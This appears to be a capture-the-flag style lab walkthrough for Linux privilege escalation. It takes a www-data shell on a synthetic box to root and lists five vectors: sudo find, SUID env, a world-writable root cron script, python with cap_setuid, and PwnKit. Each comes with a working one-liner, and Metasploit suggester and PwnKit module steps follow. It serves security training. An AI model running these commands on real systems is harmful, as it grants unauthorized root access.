🎯 Goal

You have a low-privilege www-data shell on web01. Escalate to root and read /root/flag.txt.

This lab is the identification half: the enum/ files are pre-collected enumeration output — your job is to spot all 5 privilege-escalation vectors in them and write the exact exploit one-liner for each. That spotting skill is what the exam tests.

Scenario: you landed a foothold as www-data on web01 (e.g. via the webshell upload or command injection in app 1). The box is intentionally mis-hardened. The enumeration below was already run for you — read it like an attacker and map every finding to a path to root. Full answers in solution.md.

  1. From the five enum/ files, list every path to root you can find (there are 5).
  2. For each vector, write the exact one-liner that drops a root shell (use GTFOBins).
  3. Write the Metasploit steps to go from a Meterpreter session to root (session → suggester → local exploit).
  4. Recover the flag — the root-only FLAG{...} in enum/root_flag.txt (what /root/flag.txt would hold).
Enumeration files: sudo_l.txt · suid.txt · cron.txt · capabilities.txt · system.txt  |  README.md · solution.md (real-shaped output — synthetic box, no live services)

Vector 1 · sudo find 🟢 Easy

Found in enum/sudo_l.txt — (root) NOPASSWD: /usr/bin/find. find -exec runs its command as the sudo'd user (root), no password.

💥 root one-liner 
sudo find . -exec /bin/sh \; -quit
# id -> uid=0(root)
# reference: gtfobins.github.io/gtfobins/find/

Vector 2 · SUID env 🟡 Medium

Found in enum/suid.txt — /usr/bin/env is SUID-root. env execs any program with the inherited root euid; -p stops the shell dropping it.

💥 root one-liner 
/usr/bin/env /bin/sh -p
# id -> euid=0(root)
# reference: gtfobins.github.io/gtfobins/env/ (SUID)

Vector 3 · world-writable root cron 🟡 Medium

Found in enum/cron.txt — /opt/scripts/backup.sh is rwxrwxrwx and root runs it every minute. Anyone can rewrite the script root executes.

💥 root one-liner 
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/scripts/backup.sh
# wait up to 60s for the cron tick, then:
/tmp/rootbash -p
# id -> euid=0(root)

Vector 4 · cap_setuid on python 🟠 Hard

Found in enum/capabilities.txt — /usr/bin/python3.9 = cap_setuid+ep. The capability lets the binary call setuid(0) without being SUID.

💥 root one-liner 
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id -> uid=0(root)
# reference: gtfobins.github.io/gtfobins/python/ (Capabilities)

Vector 5 · pkexec / PwnKit 🔴 Expert

Found in enum/suid.txt (pkexec is SUID-root) + enum/system.txt (Ubuntu 21.10). This version is vulnerable to CVE-2021-4034 (PwnKit) — a memory-corruption bug in pkexec giving reliable local root on default installs.

⚙️ Metasploit · Meterpreter → root 🔴 Expert

From a Meterpreter session on the box, let the suggester pick a local exploit, then run the PwnKit module to get a root session.

🧰 session → suggester → local exploit 
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION <n>
msf6 > run                                  # lists likely LPEs (pkexec, sudo, kernel)

msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6 > set SESSION <n>
msf6 > set LHOST <your-ip>
msf6 > run                                  # -> new Meterpreter as root
meterpreter > getuid                        # root
meterpreter > cat /root/flag.txt
# Note: getsystem is a Windows command — on Linux escalate with a local
# exploit module (above) or a GTFOBins vector, not getsystem.
